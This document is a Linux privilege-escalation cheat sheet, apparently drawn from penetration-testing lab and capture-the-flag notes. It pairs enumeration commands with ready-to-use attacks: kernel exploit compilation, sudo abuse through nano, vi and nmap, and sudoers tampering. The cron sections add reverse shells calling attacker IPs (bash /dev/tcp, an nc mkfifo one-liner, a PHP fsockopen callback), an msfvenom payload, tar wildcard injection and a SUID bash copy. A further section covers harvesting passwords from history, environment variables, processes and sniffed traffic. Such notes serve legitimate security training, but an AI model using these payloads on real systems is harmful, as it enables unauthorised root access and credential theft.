## Checklist
```
A quick Linux Privilege Escalation Checklist:
	Credential Access
		Reused Password
		Credentials from Configuration Files
		Credentials from Local Database
		Credentials from Bash History
		SSH Keys
		Sudo Access, Sudo Rights (.sh, nano,vi)
		Group Privileges (Docker, LXD, etc.)
	Exploit
		Services Running on Localhost
		Kernel Version
		Binary File Version
	Misconfiguration
		Cron Jobs
			Writeable Cron Job
			Writeable Cron Job Dependency (File, Python Library, etc.)
		SUID/SGID Files
		Interesting Capabilities on Binary
  Sensitive files and permission misconfigurations (SSH Keys, Shadow Files)
		Sensitive Files Writeable
			/etc/passwd
			/etc/shadow
			/etc/sudoers
			Configuration Files
		Sensitive Files Readable 
			/etc/shadow
			/root/.ssh/id_rsa (SSH Private Keys)
		Writeable PATH
			Root $PATH Writeable
			Directory in PATH Writeable
    Path Hijacking
		LD_PRELOAD Set in /etc/sudoers
  Internal Ports
  Mounted filesystems
  Interesting Groups https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe
  Process Injection https://github.com/nongiach/sudo_inject - Invalid sudo tokens
  Docker PS
```

## Quick Environment Check:
```
[+] Unix Based Hosts Quickcheck

hostname
whoami
uname -a
cat /etc/lsb-release
dmesg | grep Linux
cat /etc/passwd
cat /etc/sudoers
netstat -antup
ps -aux
ps aux | grep root
crontab -l
/sbin/ifconfig -a
iptables -L
arp -e
cat ~/.bash_history
cat ~/.ssh/authorized_keys
mount
Check installed applications
Check installed compilers/interpreters
```

## Kernel Enumeration
```
Kernel and distribution release details: 
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
```

## Kernel Exploitation
```
What's the kernel version? Is it 64-bit?:
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-

first gather information about our your target by inspecting the /etc/issue file. This is a system text file that contains a message or system identification to be printed before the login prompt on Linux machines.
mute@victim:~$ cat /etc/issue

Next, inspect the kernel version and system architecture using standard system commands:
mute@victim:~$ uname -r 
4.8.0-58-generic
mute@victim:~$ arch 
x86_64
    
Our target system appears to be running Ubuntu 16.04.3 LTS (kernel 4.8.0-58-generic) on the x86_64 architecture.
Armed with this information, we can use searchsploit to find kernel exploits matching the target version:

kali@kali:~$ searchsploit linux kernel ubuntu 16.04
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.0 | exploits/linux/local/43418.c

kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation   | linux/local/45010.c ← Identify your preferred exploit

cp /usr/share/exploitdb/exploits/linux/local/45010.c . <-- CP it.
head 45010.c -n 20 <- Check it out.
compile it, passing only the source code file and -o to specify the output filename (exploit):

n00b@victim:~$ gcc 43418.c -o exploit
n00b@victim:~$ ls -lah exploit
total 36K -rwxr-xr-x  1 kali kali  28K Jan 27 04:04 exploit
  
After compiling the exploit on our target machine, we can run it and use whoami to check your privilege level.

Compile
scp cve-2017-16995.c mute@192.168.187.178 ← Transfer c to target machine
gcc cve-2017-16995.c -o cve-2017-16995 ← Compile with  gcc on local machine
file cve-2017-16995 ← Inspect the file after compiling and make sure everything lines up before running. 

Kernel Exploit Resources:
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits
```

## Device Drivers
```
Device Drivers
Another common privilege escalation technique involves exploitation of device drivers and kernel modules. 
Since this technique relies on matching vulnerabilities with corresponding exploits, you need to gather a list of drivers and kernel modules that are loaded on the target. 
We can enumerate the loaded kernel modules using lsmod without any additional arguments.

mute@debian:~$ lsmod
Module                  Size  Used by
binfmt_misc            20480  1
rfkill                 28672  1
sb_edac                24576  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
vmw_balloon            20480  0
drm                   495616  5 vmwgfx,drm_kms_helper,ttm
libata                270336  2 ata_piix,ata_generic
vmw_pvscsi             28672  2
scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
i2c_piix4              24576  0
button                 20480  0
    Listing loaded drivers

Once we've collected the list of loaded modules and identifed those we want more information about, such as libata in the above example, we can use modinfo to find out more about the specific module. 
We should note that this tool requires the full path to run.

Displaying additional information about a module:
mute@debian-:~$ /sbin/modinfo libata
filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
version:        3.00
    
After you obtain a list of drivers and their versions, we are better positioned to find relevant exploits.
```

## OS
```
Operating System
What's the distribution type? What version? // Determine linux distribution and version:
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
uname -m    ← Check architecture
Gather System info
        > hostname
        > uname -a
        > cat /etc/*release
        
Check system info
        hostname
        uname -a
        uname -m
        cat /etc/*release
        bash --version; sh --version
        export -p
        
 Check bash version (Look for version < 4.2-048)
        > sh --version
        > csh --version
        > bash --version
        > zsh --version
```

## Installed Tools
```
Installed Tools:        
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```

## Interesting Directories
```
Home Directories
Anything "interesting" in the home directorie(s)? If it's possible to access:
ls -ahlR /root/
ls -ahlR /home/

Check:
 /
 /dev 
 /scripts 
 /opt 
 /mnt 
 /var/www/html 
 /var 
 /etc 
 /media
 /backup
```

## Environment Variables (Hard-Coded Credentials)
```
What can be learnt from the environmental variables?
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

== Environmental Information: ==
env  // Display environmental variables
set  // As above
echo $PATH  // Path information
history // Displays  command history of current user
cat /etc/profile // Display default system variables

Hard-Coded Credentials in Environment Variables
Storing a clear-text password inside an environment variable is not  a secure best practice. 
To safely authenticate with an interactive script, it's recommended to adopt public key authentication and protect private keys with passphrases.

One example of a dotfile is .bashrc. 
The .bashrc bash script is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session. 
From inside this script, additional environment variables can be specified to be automatically set whenever a new user's shell is spawned.
Sometimes system administrators store credentials inside environment variables as a way to interact with custom scripts that require authentication.
Reviewing a target Debian machine, we'll notice an unusual environment variable entry:

Inspecting Environment Variables:
mute@debian:~$ env
SCRIPT_CREDENTIALS=scream1ng_eagle   
USER=mute

Permanent Variable? The SCRIPT_CREDENTIALS variable holds a value that looks like a password. 
To confirm that we are dealing with a permanent variable, we need to inspect the .bashrc configuration file:

Inspecting .bashrc:
mute@debian~ $ cat .bashrc
export SCRIPT_CREDENTIALS="scream1ng_eagle"
HISTCONTROL=ignoreboth
    
We confirm that the variable holding the password is exported when a user's shell is launched.
Let's first try to escalate our privileges by directly typing the newly-discovered password.
mute@debian~ $ su - root
```

## Users & Groups
```
Users / Groups / Confidential Information & Users
User Information
What user information can be found?
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?:
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
cat /etc/passwd
column /etc/passwd -t -s ":"  ← Column /etc/passwd data.  
for i in $(cat /etc/passwd | awk -F ":" '{print$1}'); do id $i; done | grep euid ← list all users that have a different effective id
cat /etc/passwd | grep "sh$\|python" ← Check user accounts

Too Many Groups?
Part of too many groups? Find out all the files you've access to:
for i in $(groups); do echo "=======$i======"; find / -group $i 2>/dev/null | grep -v "proc" >> allfiles; done

list all groups:
cat /etc/group

Info about other users
cat /etc/passwd <- Take note of username
groups <username>
```

## File Owners and Permissions
```
File owners and permissions 
ls -la
find . -ls
history
cat ~/.bash_history
find / -type f -user <username> -readable 2> /dev/null # Readable files for user
find / -writable -type d 2>/dev/null # Writable files by the user
find /usr/local/ -type d -writable

Check file permissions (look at groups "medium")
            > dir /q /ad
            > icacls <file>
            - assign integrity level (must be admin)
            > icacls asd.txt /setintegritylevel(oi)(ci) High
```

## Sudoers Group?
```
cat /etc/sudoers
The /etc/sudoers file defines who can run sudo and how. I’ll add edward, allowing the user to run any command as root:
bash-4.3# echo "edward ALL=(ALL) NOPASSWD: ALL" >> /r/etc/sudoers

Now, I’ll exit from the container, and edward can run any command as root:

edward@straylight:/dev/shm$ sudo -l
Matching Defaults entries for edward on straylight:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User edward may run the following commands on straylight:
    (ALL) NOPASSWD: ALL

su gives a root shell:
```

## Abusing Sudo
```
Abusing sudo
Can sudo but absolute path is specified? Use ltrace to view libraries being loaded by these programs and check if absolute path is specified or not
sudo -l # Check programs on GTFOBins

Sudo Absolute Path
# Can sudo, abosulte path not specified?
echo "/bin/sh" > <program_name>
chmod 777 <program_name>
# Export PATH=.:$PATH
sudo <program_name>
```

## Sudo Rights
```
sudo -l <- Check what you can run as sudo and crosscheck with GTFO bins.

.sh
Take advantage and append /bin/bash -i to a file you have sudo access:
$ echo “/bin/bash -i” >> test.sh ( the file you have sudo access on)
$ cat test.sh

#!/bin/bash
echo “welcome harrison” 
/bin/bash -i

$ sudo ./test.sh
/bin/bash -i shell should spawn giving you:
root@ubuntu

nmap
$ sudo nmap --interative # start interactive nmap
nmap> !sh                # pop root shell

nano
Using nano for privilege escalation.
If you have access to nano as root but only in a specific directory like:
/bin/nano /var/opt/* - User can only use sudo in /var/opt directory. /var/opt/* makes it a bit trickier.
Use backwards traversal. cd .. or cd /home/user/xyz/../
We can execute nano as root on /var/opt, use it to traverse:
$ sudo nano /var/opt/../../etc/sudoers

Upon execution, it will open the sudoers file inside nano as root. 
Now modify the file and give the user root privileges by modifying the /etc/sudoers file you have just creatively opened. 
#includedir /etc/sudoers.d - This is the line to edit
user ALL=(root) NOPASSWD: /bin/nano /var/opt/* - This is the line to edit. Replace this line with:
user ALL=(ALL) NOPASSWD:ALL 
Save the file with the altered sudo permissions and run sudo -i.
$ sudo -i
root@ubuntu

Vi
Using Vim for privilege escalation.
Similar to a nano privesc attack  using vim and no directory restrictions are specified. 
$ sudo -l
(root) NOPASSWD: /usr/bin/vi
A unique feature of vim is the ability to open a shell inside it. 
Since you have very unrestricted access within vi 
Open vim as root and use the following

sudo vi test.sh

Once you execute vi as sudo a vi window will open, you need to switch into command mode by pressing the ESC key. 
Once in command mode, use:
:!bash - This command will open a root shell. 

Another shortcut when you have access to vim, use the following to trigger the root shell:

$ sudo vi -c ‘!bash’
```

## Hidden History
```
Hidden History
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
View the contents of all the hidden history files in the user's home directory:

cat ~/.*history | less

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. 
Note that there is no space between the -p option and the password!
Switch to the root user, using the password:
su root
```

## User History
```
What has the user being doing? Is there any password in plain text? What have they been edting?
history   ←  Displays  command history of current user
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.*history | less
```

## Networking
```
Communications & Networking
What NIC(s) does the system have? Is it connected to another network?
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

IP info:
ifconfig | more
ip a

Port info:
netstat -tulpn
netstat -peanut
netstat -ln

If no netstat
grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
OR
ss -aut

freebsd:
socks -4 -l

Network Configuration Settings
What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

Arp Cache 
Whats cached? IP and/or MAC addresses
arp -e
route
/sbin/route -nee

What other users & hosts are communicating with the system?
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

## Internal Ports
```
Internal Ports 
Any Interesting internally listening ports?
netstat -anpt
netstat -tupan // Check for ports open for local only connections

Netstat -alnp | grep LIST | grep port_num
Netstat -antp
netstat -tulnp
curl the listening ports.
```

## Firewalls
```
Firewalls
grep -Hs iptables /etc/*
```

## Printer
```
Printer
Is there a printer?
lpstat -a
```

## Applications and Services
```
Applications & Services
What services are running? Which service has which user privilege?
ps aux
ps -ef
top
cat /etc/services
```

## Root Services
```
Root Services
Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
ps aux | grep root
ps -ef | grep root
```

## Service Footprints
```
Service Footprints
watch -n 1 "ps -aux | grep pass" 
sudo tcpdump -i lo -A | grep "pass"

TCPdump
Another more holistic angle we should take into consideration when enumerating for privilege escalation is to verify whether we have rights to capture network traffic.
tcpdump is the de facto command line standard for packet capture, and it requires administrative access since it operates on raw sockets. 
However, it's not uncommon to find IT personnel accounts have been given exclusive access to this tool for troubleshooting purposes.
To illustrate the concept, we can run tcpdump as the joe user who has been granted specific sudo permissions to run it.
tcpdump cannot be run without sudo permissions. That is because it needs to set up raw sockets2 in order to capture traffic, which is a privileged operation.
Let's try to capture traffic in and out of the loopback interface, then dump its content in ASCII using the -A parameter. 
Ultimately, we want to filter any traffic containing the "pass" keyword:
sudo tcpdump -i lo -A | grep "pass"

Custom Daemons?
Harvesting Active Processes for Credentials
System administrators often rely on custom daemons to execute tasks and they sometimes neglect security best practices.
As part of our enumeration efforts, we should inspect the behavior of running processes to hunt for any anomaly that might lead to an elevation of privileges.
Unlike on Windows systems, on Linux we can list information about higher-privilege processes such as the ones running inside the root user context.

We can enumerate all the running processes with the ps command and since it only takes a single snapshot of the active processes, we can refresh it using the watch command. 
In the following example, we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass".

mute@debian:~$ watch -n 1 "ps -aux | grep pass"

mute      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t mollie@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit

We notice the administrator has configured a system daemon that is connecting to the local system with mollie's credentials in clear text. 
Most importantly, the fact that the process is running as root does not prevent us from inspecting its activity. 
```

## Responder
```
responder
Can you force an authentication?
sudo responder -I tun0
```

## Applications
```
At some point, we may need to leverage an exploit to escalate our local privileges. 
If so, our search for a working exploit begins with the enumeration of all installed applications, noting the version of each. We can use this information to search for a matching exploit.
Since it is not feasible to manually check the permissions of each file and directory, we need to automate this task as much as possible. 
As a start, we can use find to identify files with insecure permissions.
we are searching for every directory writable by the current user on the target system. 
We'll search the whole root directory (/) and use the -writable argument to specify the attribute we are interested in. 
We can also use -type d to locate directories, and filter errors with 2>/dev/null:

mute@debian:~$ find / -writable -type d 2>/dev/null

Applications
What applications are installed? What version are they? Are they currently running?
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

## Packages
```
Packages
Check installed packages
On debian (search for all packages with)
dpkg -l | grep <program>
on centos / rhel / fedora 
rpm -qa | grep <program>
freebsd:
pkg info
```

## Service Settings Misconfigurations
```
Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

// Syslog Configuration
cat /etc/syslog.conf
cat /var/log/syslog.conf
(or just: locate syslog.conf)

// Web Server Configurations
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf

// PHP Configuration
/etc/php5/apache2/php.ini

// Printer (cupsd) Configuration
cat /etc/cups/cupsd.conf

// MySql Configuration
cat /etc/my.conf

// Inetd Configuration
cat /etc/inetd.conf
```

## Processes
```
File Transfer --> pspy32
File Transfer --> pspy64 <- Larger version tends to work better for me. 
chmod 755 pspy32 pspy64
./pspy<32/64>

pspy64 was the working one and not the small version, the larger static version worked better 
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000 

See Something? 
View in process list. 
If I load pspy, sometimes I had success seeing this run every minute, but others I didn’t. But I could always notice this in the process list:
wintermute [~]$ ps auxww | grep memcached.js
 3756 nobody    0:17 /usr/bin/node /home/professor/memcached.js

And if I waited a minute, the pid would change:

wintermute [~]$ ps auxww | grep memcached.js
 3823 nobody    0:06 /usr/bin/node /home/professor/memcached.js

So each minute, this script was being run as nobody.

Additionally, I could run pspy with -f to enable file events. This is very loud, but in cases where the default of printing commands doesn’t show something, it can reveal activity. In this case (with lots of snips), each minute I’ll see:
wintermute [/tmp/.d]$ wget 10.10.14.10/pspy64
wintermute [/tmp/.d]$ chmod +x pspy64
wintermute [/tmp/.d]$ ./pspy64 -f

${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./pspy32

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░     

Every three minutes I see:


2020/04/29 22:45:01 CMD: UID=0    PID=1152   | /bin/sh -c python /opt/tmp.py 
2020/04/29 22:45:01 CMD: UID=0    PID=1153   | python /opt/tmp.py 

root is running this file.
Exploit

I’ll modify the file to add a reverse shell into it:

#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.47/443 0>&1"')

This last line should initiate a shell back to me once root runs it. At the next turn of three minutes, I get a connection:
```

## Cronjobs
```
Scheduled Tasks
The Linux-based job scheduler is known as cron. 
When these systems are misconfigured, or the user-created files are left with insecure permissions, we can modify these files that will be executed by the scheduling system at a high privilege level.
Scheduled tasks are listed under the /etc/cron.* directories, where * represents the frequency at which the task will run. 
For example, tasks that will be run daily can be found under /etc/cron.daily. Each script is listed in its own subdirectory.

crontab –u root –l ← List root user cronjobs
Look for unusual system-wide cron jobs:
cat /etc/crontab
ls /etc/cron.*

/var/log/syslog  - Cronjobs location
$ grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log

crontab -l ←  To get a list of all cron jobs for the user you are currently logged in as, use the crontab command. Content of user crontabs will be displayed on the screen.  Will print no crontab for <username>.
sudo crontab -u user1 -l  ←  list other users cron jobs, use the -u option to specify the user name.
sudo ls -1 /var/spool/cron/crontabs  ←  Find out which users have created cron jobs, list the content of the spool directory as root or sudo user.
cat /etc/crontab /etc/cron.d/*  ←  /etc/crontab and the files inside the /etc/cron.d directory are system-wide crontab files that can be edited only by the system administrators.
ls -l /etc/cron.weekly/ ←  You can also put scripts inside the /etc/cron.{hourly,daily,weekly,monthly} directories, and the scripts are executed every hour/day/week/month.

Root Cron Jobs
If we try to run the same command with the sudo prefix, we discover that a backup script is scheduled to run every minute.

Listing cron jobs for the root user:
mute@debian:~$ sudo crontab -l
[sudo] password for mute:
# Edit this file to introduce tasks to be run by cron.
# m h  dom mon dow   command
* * * * * /bin/bash /home/mute/.scripts/user_backups.sh

Listing cron jobs using sudo reveals jobs run by the root user. 
In this example, it shows a backup script running as root. 
If this file has weak permissions, we may be able to leverage it to escalate our privileges.

Find all cron jobs
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs /var/spool/anacron /etc/incron.d/* /var/spool/incron/* 2>/dev/null

Example of cron job definition:
            .---------------- minute (0 - 59)
            |  .------------- hour (0 - 23)
            |  |  .---------- day of month (1 - 31)
            |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
            |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
            |  |  |  |  |
            *  *  *  *  * user-name  command to be executed
```
## Cron Abuse 1
```
1. user_backups.sh
grep "CRON" /var/log/syslog
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/mute/.scripts/user_backups.sh)  ← Vulnerable .sh cronjob running as root
cat /home/mute/.scripts/user_backups.sh ← Inspect the vulnerable user_backups.sh being run as a cronjob
ls -lah /home/mute/.scripts/user_backups.sh ← Inspect the permissions on the vulnerable backups.sh being run
Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner.
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.156 4444 >/tmp/f" >> user_backups.sh
All we have to do now is set up a listener on our Kali Linux machine and wait for the cron job to execute.
```
## Cron Abuse 2
```
 2. overwrite.sh
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
View the contents of the system-wide crontab:
cat /etc/crontab

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
Locate the full path of the overwrite.sh file:
locate overwrite.sh

Note that the file is world-writable:
ls -l /usr/local/bin/overwrite.sh

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute).
```

## Cron Abuse 3
```
3. (Path Abuse)
View the contents of the system-wide crontab:
cat /etc/crontab

Note that the PATH variable starts with /home/user which is our user's home directory.
PATH=/home/user

Create a file called overwrite.sh in your home directory with the following contents:

#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

Make sure that the file is executable:
chmod +x /home/user/overwrite.sh

Wait for the cron job to run (should not take longer than a minute).
Run the /tmp/rootbash command with -p to gain a shell running with root privileges.
```

## Cron Abuse 4
```
4. Wildcard
View the contents of the other cron job script:
cat /usr/local/bin/compress.sh

Note that the tar command is being run with a wildcard (*) in your home directory.
tar czf /tmp/backup.tar.gz *

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
chmod +x /home/user/shell.elf

Create these two files in /home/user:
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

When the tar command in the cron job runs, the wildcard (*) will expand to include these files.
Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
nc -nvlp 4444
```

## Cron Abuse 5
```
5. PhP Poisoning
-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab 
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
The cron syntax here says that it will run every minute, as root:
The command is php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
I don’t really need to know what the Laravel artisan is doing. What does matter is that as www-data, I have write permissions on that file:

www-data@cronos:/var/www/laravel$ ls -la artisan 
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan

Poison artisan
I’ll open the artisan file and add two lines at the top:

<?php
$sock=fsockopen("10.10.14.24", 443);
exec("/bin/sh -i <&3 >&3 2>&3");

Next time the cron runs, I get a callback:
```

## Systemd Timers
```
Systemd Timers
Systemd timers are unit files that end with *.timer suffix and allow you to run service units based on time.
On Linux distributions using systemd as an init system, the timers are used as an alternative to the standard cron daemon.
To view a list of all systemd timers on your machine run the following command:

systemctl list-timers

Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
```

## Searching for Passwords / Cleartext Credentials
```
Plain Text Credentials
Search for configuration files recursively;
# Search for *.conf (case-insensitive) files recursively starting with /etc;
find /etc -iname *.conf

Search password string recursively:
root@kali:~/Desktop/html# grep -i -r "password = '" ./
grep -i -r "password = '" ./
the above command would search everything in the "html" folder for password as a string

Search for specific strings inside a file
Any plain text usernames and/or passwords in a file?
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]

Searching for Passwords
file ./somefile   ← Get information about a file with 'file' command
strings ./*.txt | grep password  ← Search for all txt files in the pwd and grep password
find / -name “*.log” |xargs grep -i pass  ←  Find all files in / ending with .log and grep pass
grep -l -i pass /var/log/*.log 2>/dev/null  ← Check log files for keywords (‘pass’ in this example) and show positive matches
find / -maxdepth 10 -name *.conf -type f | grep -Hn pass; 2>/dev/null ←  Searches for the string 'password' in .conf files in / and outputs the line number 
find / -maxdepth 10 -name *etc* -type f | grep -Hn pass; 2>/dev/null  //as above, but in *etc*  ← Search /etc for files and grep pass and output the line number
find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null  ← Find .conf files (recursive 4 levels) and output line number where the word password is located
grep -i -r "password = '" ./ ← Grep present working directory recursively for the string password. 

What sensitive files can be found?
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

Scripts / Databases / Configuration / Log Files
// Are there any hardcoded passwords in scripts, databases or configuration files
Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg






















